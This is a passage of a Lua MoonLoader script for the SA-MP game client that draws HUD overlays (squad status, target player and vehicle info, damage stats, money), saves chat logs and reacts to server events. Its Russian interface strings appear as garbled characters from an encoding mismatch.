						if not SetMode then 	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_afkX, config_ini.ovCoords.show_afkY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_afkX, config_ini.ovCoords.show_afkY)) end end
						imgui.Begin('#empty_field9', show.show_afk, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{00FF00}AFK')
						imgui.PopFont()
						s_afk = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[33] == 1 then
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY)) end end
						imgui.Begin('#empty_field14', show.show_tecinfo, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFontl)
							local imlej = SetMode and "231, 412, 999" or lastID.e
						if imlej ~= "none" then imgui.TextColoredRGB('ID ����. ��. ������ (lej): ' .. imlej .. '') end
							local immkv = SetMode and "A-12" or lastKV.m
						if immkv ~= "none" then imgui.TextColoredRGB('����. ��. ����. ��������� (mkv): ' .. immkv .. '') end
							local imbkv = SetMode and "�-14" or lastKV.b
						if imbkv ~= "none" then imgui.TextColoredRGB('����. ��. ����. ����� (bkv): ' .. imbkv .. '') end
							local pedskol = #getAllChars() -1
							--for k, v in ipairs(getAllChars()) do local id = select(2, sampGetPlayerIdByCharHandle(v)) if not sampIsPlayerNpc(id) then print(sampGetPlayerNickname(id)) pedskol = pedskol + 1 end end
						imgui.TextColoredRGB('���������� ���������� � ����������: ' .. pedskol .. '')
							local CStatus = CTaskArr["CurrentID"] == 0 and "{FFFAFA}�������� �������" or "" .. CTaskArr["n"][CTaskArr[1][CTaskArr["CurrentID"]]] .. " " .. (indexof(CTaskArr[1][CTaskArr["CurrentID"]], CTaskArr["nn"]) ~= false and CTaskArr[3][CTaskArr["CurrentID"]] or "") .. ""
						imgui.TextColoredRGB('������ ����������� �������: ' .. CStatus .. '')
						s_tecinfo = imgui.GetWindowPos()
						imgui.PopFont()
						imgui.End()
				end

				if config_ini.bools[37] == 1 and sampIsChatInputActive() then
						local in1 = sampGetInputInfoPtr()
			      local in1_1 = getStructElement(in1, 0x8, 4)
			      local in2 = getStructElement(--[[int]] in1_1, --[[int]] 0x8, --[[int]] 4)
			      local in3 = getStructElement(--[[int]] in1_1, --[[int]] 0xC, --[[int]] 4)
			      local fib = in3 + 40
			      local fib2 = in2 + 5
					  local success = ffi.C.GetKeyboardLayoutNameA(keybbb.KeyboardLayoutName)
					  local errorCode = ffi.C.GetLocaleInfoA(tonumber(ffi.string(keybbb.KeyboardLayoutName), 16), 0x00000002, keybbb.LocalInfo, 32)
					  local localName = ffi.string(keybbb.LocalInfo)
						local capsState = ffi.C.GetKeyState(20)
						imgui.SetNextWindowPos(imgui.ImVec2(fib2, fib))
						imgui.Begin('#empty_field37', show.show_keyb, 1 + 32 + 2 + SetModeCond + 64)
						imgui.TextColoredRGB("���������: {ffffff}" .. localName .. "; CAPS:" .. getStrByState(capsState) .. "")
						imgui.End()
				end
				
				if config_ini.bools[41] == 1 and (rCache.enable or SetMode) and not sampIsChatInputActive() then
					if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY)) end end
					imgui.Begin('#empty_field37', show.show_squad, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB("{" .. config_ini.squadset[1] .. "}������ ������")

					if not SetMode then
						local tkeys = {}
						-- populate the table that holds the keys
						for k in pairs(rCache.smem) do table.insert(tkeys, k) end
						-- sort the keys
						table.sort(tkeys)
						local A_Index = 1
						for a, k in ipairs(tkeys) do
							if k ~= nil then
								local v = rCache.smem[k]
								local sqcol
								local HP
								local ARM
								if sampGetCharHandleBySampPlayerId(k) then
									sqcol = v.color
									ARM = sampGetPlayerArmor(k)
									HP = sampGetPlayerHealth(k)
								else
									sqcol = v.colorns
									ARM = 0
									HP = 0
								end
								
								local afk = (v.time ~= 0 and v.time + 30 <= os.time()) and "{008000} AFK: " .. (os.time() - v.time) .. "" or "" 
								imgui.TextColoredRGB("{" .. sqcol .. "}" .. v.name .. " [" .. k .. "]" .. afk .. "")
								if k == select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then
									local myHP = getCharHealth(PLAYER_PED)
									local myARM = getCharArmour(PLAYER_PED)
									imgui.SwitchContext()
									colors[clr.PlotHistogram] = imgui.ImVec4(0.7, 0, 0, 1) imgui.ProgressBar(myHP / 100, imgui.ImVec2(70, 3.0)) imgui.SameLine() imgui.SwitchContext() colors[clr.PlotHistogram] = imgui.ImVec4(0.9, 0.9, 0.9, 1) imgui.ProgressBar(myARM / 100, imgui.ImVec2(70, 3.0))
								else
									colors[clr.PlotHistogram] = imgui.ImVec4(0.7, 0, 0, 1) imgui.ProgressBar(HP / 100, imgui.ImVec2(70, 3.0)) imgui.SameLine() imgui.SwitchContext() colors[clr.PlotHistogram] = imgui.ImVec4(0.9, 0.9, 0.9, 1) imgui.ProgressBar(ARM / 100, imgui.ImVec2(70, 3.0))
								end
								A_Index = A_Index + 1
							end
						end
					else
						imgui.TextColoredRGB("{FF000099}Timur_Epremidze [123]")
						imgui.TextColoredRGB("{FF0000}Vasiliy_Pupkin [0]{008000} AFK: 620")
						imgui.TextColoredRGB("{FFFAFA99}Vanya_Ivanov [985]")
						imgui.TextColoredRGB("{FFFAFA}Dmitriy_Sidorov [83]")
						imgui.TextColoredRGB("{FF000095}Vlad_Petrov [67]{008000} AFK: 900")
					end
					
					s_squad = imgui.GetWindowPos()					
					imgui.PopFont()
					imgui.End()
				end
				
				if (config_ini.bools[43] == 1 and show.show_500.bool500.v) or SetMode then
					if not SetMode then
						if (os.time() - show.show_500.time500 <= 5) then
							imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y))
							imgui.Begin('#empty_field39', show.show_500.bool500, 1 + 32 + 2 + SetModeCond + 64)
							imgui.PushFont(imfonts.font500)
							local money = tostring(500 * show.show_500.mult500)
							imgui.TextColoredRGB("{" .. config_ini.plus500[1] .. "}$" .. money .. "")
							imgui.PopFont()
							imgui.End()
						else
							show.show_500.bool500.v = false
							show.show_500.mult500 = 0
						end
					else
						if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y)) end
						imgui.Begin('#empty_field39', show.show_500.bool500, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.font500)
						imgui.TextColoredRGB("{" .. config_ini.plus500[1] .. "}$1500")
						imgui.PopFont()
						s_500 = imgui.GetWindowPos()
						imgui.End()
					end
				end
				
				if config_ini.bools[44] == 1 then
						if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY))	end end
						imgui.Begin('#empty_field40', show.show_dmind.bool, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						if not images[1] then if doesFileExist('Moonloader\\Pictures\\gunicons\\total.png') then images[1] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\total.png') end end
						if not images[2] then if doesFileExist('Moonloader\\Pictures\\gunicons\\desert_eagleicon.png') then images[2] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\desert_eagleicon.png') end end
						if not images[3] then if doesFileExist('Moonloader\\Pictures\\gunicons\\chromegunicon.png') then images[3] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\chromegunicon.png') end end
						if not images[4] then if doesFileExist('Moonloader\\Pictures\\gunicons\\M4icon.png') then images[4] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\M4icon.png') end end
						if not images[5] then if doesFileExist('Moonloader\\Pictures\\gunicons\\cuntgunicon.png') then images[5] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\cuntgunicon.png') end end
						if not images[6] then if doesFileExist('Moonloader\\Pictures\\gunicons\\mp5lngicon.png') then images[6] = imgui.CreateTextureFromFile('Moonloader\\Pictures\\gunicons\\mp5lngicon.png') end end
						
						local acc = (show.show_dmind.damind.hits[24] == 0 or show.show_dmind.damind.shots[24] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[24] / (show.show_dmind.damind.shots[24] / 100))
							imgui.Image(images[2], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[24]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[25] == 0 or show.show_dmind.damind.shots[25] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[25] / (show.show_dmind.damind.shots[25] / 100))
							imgui.Image(images[3], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[25]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[31] == 0 or show.show_dmind.damind.shots[31] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[31] / (show.show_dmind.damind.shots[31] / 100))
							imgui.Image(images[4], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[31]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[33] == 0 or show.show_dmind.damind.shots[33] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[33] / (show.show_dmind.damind.shots[33] / 100))
							imgui.Image(images[5], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[33]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[29] == 0 or show.show_dmind.damind.shots[29] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[29] / (show.show_dmind.damind.shots[29] / 100))
							imgui.Image(images[6], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[29]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						local acc = (show.show_dmind.damind.hits[1] == 0 or show.show_dmind.damind.shots[1] == 0) and 0 or math.ceil(show.show_dmind.damind.hits[1] / (show.show_dmind.damind.shots[1] / 100))
							imgui.Image(images[1], imgui.ImVec2(32, 32)) imgui.SameLine() imgui.TextColoredRGB('{F0F0F0}' .. math.ceil(show.show_dmind.damind.damage[1]) .. ' | ' .. acc .. '%') --imgui.NewLine()
						imgui.PopFont()
						s_dind = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[52] == 1 then
					if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY))	end end
					imgui.Begin('#empty_field41', show.show_dam, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB('{fffafa}���������� ����:')
					for k, v in ipairs(dinf[2].id) do if v ~= -1 then imgui.TextColoredRGB('{' .. dinf[2].clist[k] .. '}' .. dinf[2].nick[k] .. '[' .. v .. '] {fffafa}- ' .. dinf[2].weapon[k] .. ' +' .. dinf[2].damage[k] .. '') end end
					s_dam = imgui.GetWindowPos()
					imgui.PopFont()
					imgui.End()

					imgui.SetNextWindowPos(imgui.ImVec2(s_dam.x + 400, s_dam.y))
					imgui.Begin('#empty_field42', show.show_dam, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFontsquad)
					imgui.TextColoredRGB('{fffafa}���������� ����:')
					for k, v in ipairs(dinf[1].id) do if v ~= -1 then imgui.TextColoredRGB('{' .. dinf[1].clist[k] .. '}' .. dinf[1].nick[k] .. '[' .. v .. '] {fffafa}- ' .. dinf[1].weapon[k] .. ' -' .. dinf[1].damage[k] .. '') end end
					imgui.PopFont()
					imgui.End()
				end

				if config_ini.bools[58] == 1 then
					if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY))	end end
					imgui.SetNextWindowSize(imgui.ImVec2(config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY), imgui.Cond.Always)
					imgui.Begin("#empty_field44", show.show_fond, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.fontmoney)
					local m1 = tonumber(fond[1])
					local m2 = tonumber(fond[2])
					imgui.TextColoredRGB("{" .. config_ini.fondset[1] .. "}$" .. fond[1] .. "")
					imgui.TextColoredRGB(m1 == nil and "{" .. config_ini.fondset[2] .. "}$" .. fond[2] .. "" or "{" .. (m2 - m1 < 0 and "FF0000" or "" .. config_ini.fondset[2] .. "") .. "}$" .. tostring(math.floor(m2)-m1) .. "")
					s_money = imgui.GetWindowPos()
					imgui.PopFont()
					imgui.End()
				end

				SetModeFirstShow = false
		--end
end

function targetinfo()
	local SetModeCond = SetMode and 0 or 4
	local crsX, crsY, crsZ = convertScreenCoordsToWorld3D(sx, sy, 700.0)
						local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
						local camX, camY, camZ = getActiveCameraCoordinates()
						local result, colpoint = processLineOfSight(camX, camY, camZ, crsX, crsY, crsZ, true, true, true, true, false, false, true, true)
						local hcar
						if result or SetMode then
								-- ���������� � ������ � �������
							if not SetMode then
								if colpoint.entityType == 2 and doesVehicleExist(getVehiclePointerHandle(colpoint.entity)) then -- ����������� � ������ � �������
									hcar = getVehiclePointerHandle(colpoint.entity)
								else -- ����� ������ ������ �������
									local car_cx = representIntAsFloat(readMemory(0xB6EC10, 4, false))
									local car_cy = representIntAsFloat(readMemory(0xB6EC14, 4, false))
									local car_w, car_h = getScreenResolution()
									local car_xc, car_yc = car_w * car_cy, car_h * car_cx

									local minDist = ((car_w / 2) / getCameraFov()) * 10
									local closestCarId, closestCarhandle = -1, -1
									local carhandles = getcars()
									if carhandles ~= nil then
										for k, v in pairs(carhandles) do
											if doesVehicleExist(v) and isCarOnScreen(v) then
												local idcar = getCarModel(v)
												local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
												local cX, cY, cZ = getCarCoordinates(v)
												local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2)))
												if distanse < 300 then
													local car_xi, car_yi = convert3DCoordsToScreen(cX, cY, cZ)
													local dist = math.sqrt( (car_xi - car_xc) ^ 2 + (car_yi - car_yc) ^ 2 )
													if dist < minDist then
														minDist = dist		
														if isLineOfSightClear(myX, myY, myZ, cX, cY, cZ, true, false, false, true, false) then hcar = v	break end
													end
												end
											end
										end
									end
								end
								
								if hcar ~= nil then -- ���� ������ �������
									local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900"}
									local carX, carY, carZ = getCarCoordinates(hcar)
									local cardist = math.ceil(math.sqrt( ((myX-carX)^2) + ((myY-carY)^2) + ((myZ-carZ)^2)))
									local cidcar = getCarModel(hcar)
									local ccHP = getCarHealth(hcar)
									local ccol = ccHP > 800 and "00FF00" or ccHP > 500 and "FFFF00" or "FF0000"
									local doorStatus = getCarDoorLockStatus(hcar) == 2 and "{ff0000}�������" or "{00ff00}�������"
									local tirestatus = motos[cidcar] ~= nil and isCarTireBurst(hcar, 1) and "; {FF0000}������� ������ ������" or ""
									local cresult2, cid = sampGetVehicleIdByCarHandle(hcar)
									local dist = getshotdist(hcar)
									
									local fcar
									if cIDs[cid] ~= nil then
										fcar = cIDs[cid]
									else
										fcar =  "CID: " .. cid .. ""
									end
									
									if cresult2 then
										lastcarhandle = hcar
										imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY))
										imgui.Begin('#empty_field16', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
										imgui.PushFont(imfonts.exFontl)
										imgui.TextColoredRGB("{FFFAFA}���: " .. tVehicleNames[cidcar-399] .. "[" .. cidcar .. "]; ��������: {" .. ccol .. "}" .. ccHP .. "; {FFFAFA}" .. fcar .. "")
										imgui.TextColoredRGB("" .. dist .. " �. " .. tirestatus .. "")
										s_targetCar = imgui.GetWindowPos()
										imgui.PopFont()
										imgui.End()
									else
										lastcarhandle = nil
									end
									
									--if not SetMode and isKeyDown(0x12) and not piearr.reportpie.action and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA} �������� ��������� " .. tVehicleNames[cidcar-399] .. "[" .. cidcar .. "], " .. fcar .. "", 0xFFFFFAFA) piearr.reportpie.handle = hcar piearr.reportpie.mode = 2 piearr.reportpie.pie_mode.v = true imgui.ShowCursor = true piearr.reportpie.action = true else piearr.reportpie.pie_mode.v = false imgui.ShowCursor = false piearr.reportpie.action = false end
								end
							else
								if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY)) end
								imgui.Begin('#empty_field16', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFontl)
								imgui.TextColoredRGB("{FFFAFA}���: NRG-500[522]; {FFFAFA}��������: {FFFF00}600; {fffafa}����� ��")
								imgui.TextColoredRGB("{00ff00}����������: 120/200 �. {ff0000}������� ������ ������")
								s_targetCar = imgui.GetWindowPos()
								imgui.PopFont()
								imgui.End()
							end

							local suct = false
							local tped
							if not SetMode then
								if colpoint.entityType == 3 and doesCharExist(getCharPointerHandle(colpoint.entity)) then
									tped = getCharPointerHandle(colpoint.entity)
									if tped ~= PLAYER_PED then
										target.id = select(2, sampGetPlayerIdByCharHandle(tped))
										target.time = os.clock()
										target.suct = true
									end
								else
									if target.id ~= 1000 then 
										if target.time + 1.5 > os.clock() then
											local res, tar = sampGetCharHandleBySampPlayerId(target.id)
											if res then
												local tX, tY, tZ = getCharCoordinates(tar)
												local result2, colpoint2 = processLineOfSight(camX, camY, camZ, tX, tY, tZ, true, true, true, true, true, true, true, true)
												if result2 then
													if colpoint2.entityType == 3 then
														local ped = getCharPointerHandle(colpoint2.entity)
														if doesCharExist(ped) and ped == tar then 
															target.suct = true 
															tped = tar 
														end
													else
														target.suct = false
														target.id = 1000 
														target.time = 0
													end
												end
											else 
												target.suct = false
												target.id = 1000 
												target.time = 0 
													
											end
										else
											target.suct = false
											target.id = 1000
											target.time = 0	
										end
									else
										target.suct = false
									end
								end
							else
								target.suct = true
							end

							if target.suct then
								local result, id
								if not SetMode then result, id = sampGetPlayerIdByCharHandle(tped) else result = true end
								if result and id ~= select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)) then -- ���������, ������ �� ��������� ��� �������
									lastTargetID = id
									local myX, myY, myZ, tX, tY, tZ
									if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY)) end end
									imgui.Begin('#empty_field10', show.show_target, 1 + 32 + 2 + SetModeCond + 64)
									if not crosimage then
										if doesFileExist('Moonloader\\Pictures\\Crosshair.png') then
											crosimage = imgui.CreateTextureFromFile('Moonloader\\Pictures\\Crosshair.png')
											if not crosimage then imgui.OpenPopup('Texture Loading Error') end
										else -- ���� ����� ���
											imgui.OpenPopup('Texture Loading Error')
										end
									else  -- ���������� ��������, ���� ���������
										imgui.Image(crosimage, imgui.ImVec2(800, 193))
									end
									s_target = imgui.GetWindowPos()
									imgui.End()

									local str1coorX = s_target.x + 75
									local str1coorY = s_target.y - 20
									local curdistanse, wID, weapdist
									local fARM, fHP, tName, hpcol, mwID
									imgui.SetNextWindowPos(imgui.ImVec2(str1coorX, str1coorY))
									imgui.Begin('#empty_field11', show.show_target, 1 + 32 + 2 + 4 + 64)
									if not SetMode then
										fARM = sampGetPlayerArmor(id)
										fHP = sampGetPlayerHealth(id)
										tName = sampGetPlayerNickname(id)
										mwID = tonumber(getCurrentCharWeapon(PLAYER_PED))
										local myDmg = tweapondamage[mwID] ~= nil and tweapondamage[mwID] or 1
										if myDmg == 0 then
											hpcol = (fHP + fARM) >= 100 and "{00FF00}" or (fHP + fARM) <= 30 and "{FF0000}" or "{FFFF00}"
										else
											local shcolhp = math.ceil((fARM + fHP)/ myDmg)
											if mwID == 24 or mwID == 25 or mwID == 33 then
												hpcol = shcolhp <= 1 and "{FF0000}" or shcolhp <= 2 and "{FFFF00}" or "{00FF00}"
											elseif mwID == 23 or mwID == 29 or mwID == 30 or mwID == 31 then
												hpcol = shcolhp <= 3 and "{FF0000}" or shcolhp <= 5 and "{FFFF00}" or "{00FF00}"
											else
												hpcol = (fHP + fARM) >= 100 and "{00FF00}" or (fHP + fARM) <= 30 and "{FF0000}" or "{FFFF00}"
											end
										end
									else
										tName = "Vasya_Pupkin"
										id = 231
										fHP = 100
										fARM = 16
										hpcol = "{00FF00}"
									end

									if not SetMode then
										local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
										local tX, tY, tZ = getCharCoordinates(tped)
										curdistanse = math.ceil(math.sqrt( ((myX-tX)^2) + ((myY-tY)^2) + ((myZ-tZ)^2)))
										wID = tonumber(getCurrentCharWeapon(tped))
										weapdist = tweapondist[mwID] ~= nil and tweapondist[mwID] or 0
									else
										curdistanse = 92
										wID = 24
										weapdist = 50
									end

									if curdistanse > 22 then 
										fHP, fARM = "����������", "����������"
										if (curdistanse <= 55 and mwID == 33) or (curdistanse <= 50 and (mwID == 30 or mwID == 31)) or (curdistanse <= 35) then else hpcol = "{FFFAFA}" end
									end

									imgui.PushFont(imfonts.exFont)
									imgui.TextColoredRGB('{FFFAFA}' .. hpcol .. '�������� ����: ' .. fHP .. ' ����� ����: ' .. fARM .. '')
									imgui.PopFont()
									imgui.End()

									local str2coorX = s_target.x + 21
									local str2coorY = s_target.y + 148
									imgui.SetNextWindowPos(imgui.ImVec2(str2coorX, str2coorY))
									imgui.Begin('#empty_field12', show_target, 1 + 32 + 2 + 4 + 64)

									imgui.PushFont(imfonts.exFont)
									imgui.TextColoredRGB('{FFFAFA}���������: ' .. curdistanse .. '/' .. weapdist .. ' �. ������: ' .. returnWeapDistCol(wID, curdistanse) .. '' .. tweaponNames[wID] .. '')
									imgui.PopFont()
									imgui.End()
									
									--if not SetMode and isKeyDown(0x12) and not piearr.reportpie.action and not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA} �������� ��������� " .. sampGetPlayerNickname(id) .. "[" .. id .. "], " .. curdistanse .. " �.", 0xFFFFFAFA) piearr.reportpie.handle = tped piearr.reportpie.mode = 1 piearr.reportpie.pie_mode.v = true imgui.ShowCursor = true piearr.reportpie.action = true else piearr.reportpie.pie_mode.v = false imgui.ShowCursor = false piearr.reportpie.action = false end
								end
							end
						end
end

function onQuitGame()
	-- ��������� ������
	local arr = {[1] = "������", [2] = "�������", [3] = "����", [4] = "������", [5] = "���", [6] = "����", [7] = "����", [8] = "������", [9] = "��������", [10] = "�������", [11] = "������", [12] = "�������"}
	local m = arr[tonumber(os.date("%m"):match("0?(%d+)"))]
	local y = os.date("%Y")

	lfs.chdir("" .. getWorkingDirectory() .. "\\Chatlogs")
	if not isDir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "") then lfs.mkdir(y) end
	lfs.chdir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "")
	if not isDir("" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "\\" .. m .. "") then lfs.mkdir(m) end

	print("Saving chatlog...")
	local path_log = memory.tostring(sampGetBase() + 0x219F88) .. "\\chatlog.txt"
	local saved_log = "" .. getWorkingDirectory() .. "\\Chatlogs\\" .. y .. "\\" .. m .. "\\" .. os.date("%d.%m.%y") .. ".txt"
	local chatlog = io.open(path_log, "r")
	local chatlog_text = chatlog:read("*a")
	chatlog:close()

	local chatlog_new = io.open(saved_log, "a")
	chatlog_new:write("" .. chatlog_text .."\n############################################################################������ ����������� � " .. os.date("%d.%m.%y %X") .. "############################################################################\n")
	chatlog_new:close()
	print("Saved.")
end

function onScriptTerminate(s, bool)
	if s == thisScript() and not bool then
		for i = 0, 1000 do if sampIs3dTextDefined(2048 - i) then sampDestroy3dText(2048 - i) end end
		if not isobnova then sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}������ ��������. ������� ��������� �� ������ � �������� ������������. ������� CTRL + R ��� �����������.", 0xFFFF0000) end
	end
	
end

function ev.onGivePlayerMoney(money)
	fond[2] = tostring(money)
end

function ev.onShowTextDraw(id, data)
	if data.text == "kmh" then
		CTaskArr[10][2][1][3] = id + 2
	end

	if data.text:match("FUEL ~w~(%d+)") ~= nil then
		CTaskArr[10][2][1][3] = id
	end

	if id == CTaskArr[10][2][1][3] then
		local f = data.text:match("(%d+)")
		if f ~= nil then
			CTaskArr[10][2][1][1] = f
		end
	end
	--lua: 2066   kmh
	--a: 2068   0
end

function ev.onTextDrawSetString(id, text)
	if id == CTaskArr[10][2][1][3] then 
		local f = text:match("(%d+)")
		if f ~= nil then
			CTaskArr[10][2][1][1] = f
		end
	end
end

function ev.onDisplayGameText(style, time, str)
	if config_ini.bools[59] == 1 and str == "~r~Fuel has ended" and style == 4 and time == 3000 then
		sampSendChat("/fillcar")
	end

	if config_ini.bools[43] == 1 and str == "~g~$500" then
		show.show_500.bool500.v = true
		if (os.time() - show.show_500.time500 <= 5) then
			show.show_500.mult500 = show.show_500.mult500 + 1
			show.show_500.time500 = os.time()
			return false
		else
			show.show_500.mult500 = 1
			show.show_500.time500 = os.time()
			return false
		end
	end
end

function ev.onPlayerQuit(id, reason)
	if config_ini.bools[55] == 1 and sampGetCharHandleBySampPlayerId(id) then
		local reasons = {[0] = '�������/����', [1] = '/q', [2] = '���'}
		sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}����� " .. sampGetPlayerNickname(id) .. "[" .. tostring(id) .. "] ����� � ����. �������: " .. reasons[reason] .. ".", 0xFFFF0000)
	end

	onlinearr[id] = ""
	if sampIs3dTextDefined(2048 - id) then sampDestroy3dText(2048 - id) end
end

function ev.onSendDeathNotification(reason, id)
	if config_ini.bools[53] == 1 and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then BKTimerTickCount = os.time() end
end

function ev.onPlayerJoin(id, color, isNpc, nickname)
	onlinearr[id] = nickname
	if config_ini.bools[35] == 1 and memb_ini ~= nil then
		local color = 0x00FFFAFA
		sampCreate3dTextEx(2048 - id, memb_ini.players[nickname], color, 0, 0, 0.4, 22, false, id, -1)
	end
end

function ev.onSendCommand(cmd)
	if 1 == 2 then--if config_ini.bools[56] == 1 then
		if sampIsChatCommandDefined(cmd) then return end
		if not isSending then
			local cmds = {["sms"] = 50, ["t"] = 50, ["pm"] = 50}
			local c, id, text
			local c, text = cmd:match("%/(%w+) (.*)")
			if c == nil then return end
			if cmds[string.rlower(c)] ~= nil then id, text = text:match("(%w+) (.*)") end
			local t = strunsplit(text, cmds[string.rlower(c)] ~= nil and cmds[string.rlower(c)] or 80)
			isSending = true
			lua_thread.create(function() for k, v in ipairs(t) do sampSendChat("/" .. c .. " " .. (id == nil and "" or "" .. id .. " ") .. "" .. v .. "") wait(1300) end isSending = false end)
			return false
		end
	end
end

function ev.onSendChat(text)
	if 1 == 2 then --if config_ini.bools[56] == 1 then
		if not isSending then 
			local t = strunsplit(text, 100)
			isSending = true
			lua_thread.create(function() for k, v in ipairs(t) do sampSendChat(v) wait(1300) end isSending = false end)
			return false
		end
	end
end

function ev.onServerMessage(col, text)
		if col == -65281 then
			local nn, nf = text:match('��� ����� ��� %" (%a+)%_(%a+) %"%. ������� ��� � ������� SA%-MP%, � ���� %"Name%"')
			if nn ~= nil then
				lua_thread.create(function()
					sampAddChatMessage("{ff0000}[LUA-Exchange] ��������! {FFFAFA}���������� ����� �������� ����.")
					sampAddChatMessage("{ff0000}[LUA-Exchange] {FFFAFA}������ �������� ���������� ����� � �������. {FF0000}�� �������� �� ����!!!")
					local A_Index = 0
					while true do
						if A_Index == 20 then break end
						local text = sampGetChatString(99 - A_Index)
		
						local onn, of = text:match("%a+%_%a+ �������%(�%) ������ �� ����� ����%: (%a+)%_(%a+) %>%> " .. nn .. "%_" .. nf .. "")
						if onn ~= nil then
							local oldnick = "" .. onn .. " " .. of .. ""
							local newnick = "" .. nn .. " " .. nf .. ""
							local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=upnick&oldnick=" .. oldnick .. "&newnick=" .. newnick .. "")
